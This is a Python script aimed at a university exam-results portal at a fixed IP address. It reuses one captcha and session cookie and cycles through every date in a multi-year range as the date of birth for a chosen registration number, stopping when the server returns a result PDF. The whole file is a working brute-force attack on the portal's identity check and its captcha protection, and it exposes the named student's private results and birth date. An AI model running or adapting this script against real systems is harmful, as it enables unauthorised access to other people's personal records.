import aiohttp
import asyncio
import time
import utils
import requests
import pandas as pd

URL = 'http://101.251.6.66/index.php'
REGISTRATION_NUMBER = 'ENTER REGISTRATION NUM HERE'
START_DATE = '1999-05-12' #approx start_date
END_DATE = '2003-06-12' #approx end_date
EXAM_TYPE='Regular'
EXAM_YEAR ='2022'
SEMESTER_YEAR = 'I'
SEMESTER_PART = 'II'


DATES = pd.date_range(start=START_DATE, end=END_DATE)
start_time = time.time()

async def main():
    COOKIE_CODE, CAPTCHA = utils.get_captcha_and_sessid()
    print('Wait for few seconds!!')
    HEADERS = {
    'Cookie': f'PHPSESSID={COOKIE_CODE}',
    'Content-Type': 'application/x-www-form-urlencoded'
    }

    async with aiohttp.ClientSession() as session:
        for date in DATES:
            payload = {
                "mode": "resView",
                "frmAction": "submit",
                "regNumber": REGISTRATION_NUMBER,
                "dob": f"{str(date)[:10]}",
                "examType": EXAM_TYPE,
                "examYear": EXAM_YEAR,
                "semYear": SEMESTER_YEAR,
                "semPart": SEMESTER_PART,
                "captcha": str(CAPTCHA)
            }

            async with session.post(URL, headers=HEADERS, data=payload) as resp:
                if resp.headers['Content-Type'] == 'application/pdf':
                    res = await resp.read()
                    with open('result.pdf', 'wb') as f:
                        f.write(res)
                        print('result acquired successfully')
                        return
        print('No result found!')
asyncio.run(main())
print("--- %s seconds ---" % (time.time() - start_time))
